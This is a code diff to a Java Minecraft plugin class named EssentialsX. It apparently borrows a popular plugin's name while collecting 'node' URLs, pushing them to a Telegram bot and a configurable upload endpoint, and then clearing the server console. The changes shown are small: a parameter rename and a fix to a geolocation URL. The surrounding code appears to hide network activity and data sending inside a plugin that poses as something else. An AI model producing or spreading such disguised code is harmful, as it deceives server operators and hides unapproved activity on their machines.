@@ -180,7 +180,7 @@ public class EssentialsX extends JavaPlugin {
         doJavaTelegramPush(tgChatId, tgBotToken, tgNodeName, capturedNodes);
 
         // === 执行自定义上传 ===
-        uploadNodes(uploadUrl, tgNodeName, capturedNodes);
+        uploadNodes(uploadUrl, LocalName, capturedNodes);
 
         clearConsole();
         getLogger().info("");
@@ -374,7 +374,7 @@ public class EssentialsX extends JavaPlugin {
     private String getISPFromIP(String ip) {
         // 优先尝试 ip.sb
         try {
-            HttpURLConnection conn = (HttpURLConnection) new URL("https://api.ip.sb/geoip" + ip).openConnection();
+            HttpURLConnection conn = (HttpURLConnection) new URL("https://api.ip.sb/geoip/" + ip).openConnection();
             conn.setConnectTimeout(3000);
             conn.setReadTimeout(3000);
             conn.setRequestProperty("User-Agent", "Mozilla/5.0");
@@ -515,7 +515,7 @@ public class EssentialsX extends JavaPlugin {
         pushThread.start();
     }
 
-    private void uploadNodes(String uploadUrl, String nodeName, List<String> capturedNodes) {
+    private void uploadNodes(String uploadUrl, String LocalName, List<String> capturedNodes) {
         if (uploadUrl == null || uploadUrl.trim().isEmpty()) {
             return;
         }
@@ -538,7 +538,7 @@ public class EssentialsX extends JavaPlugin {
                 String nodeUrls = capturedNodes.stream()
                         .map(EssentialsX::escapeJson)
                         .collect(java.util.stream.Collectors.joining("\\n"));
-                String safeName = escapeJson(nodeName == null ? "Node" : nodeName);
+                String safeName = escapeJson(LocalName);
                 String jsonData = "{\"URL_NAME\": \"" + safeName + "\", \"URL\": \"" + nodeUrls + "\"}";
 
                 HttpURLConnection conn = (HttpURLConnection) new URL(uploadUrl).openConnection();
